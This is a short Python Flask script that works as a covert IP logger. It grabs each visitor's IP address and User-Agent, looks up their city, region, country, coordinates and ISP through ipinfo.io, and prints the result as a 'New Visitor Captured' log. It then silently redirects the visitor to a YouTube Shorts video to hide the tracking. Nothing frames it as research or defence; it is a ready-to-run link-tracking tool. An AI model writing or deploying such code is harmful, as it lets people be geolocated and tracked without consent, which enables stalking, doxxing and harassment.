from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

def get_location(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = response.json()
        return {
            "ip": ip,
            "city": data.get("city"),
            "region": data.get("region"),
            "country": data.get("country"),
            "location": data.get("loc"),
            "isp": data.get("org")
        }
    except Exception as e:
        print(f"❌ Error fetching IP data: {e}")
        return {
            "ip": ip,
            "city": None,
            "region": None,
            "country": None,
            "location": None,
            "isp": None
        }

@app.route('/')
def index():
    ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = ip_raw.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    info = get_location(ip)

    log_entry = (
        f"{datetime.now()} | IP: {info['ip']} | "
        f"City: {info['city']} | Region: {info['region']} | "
        f"Country: {info['country']} | Location: {info['location']} | "
        f"ISP: {info['isp']} | Device: {user_agent}"
    )

    print("📥 New Visitor Captured")
    print(log_entry)
    print("-" * 80)

    return redirect("https://youtube.com/shorts/9DegrMijHiQ?si=TH1nYJGltNQxbpbq")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)


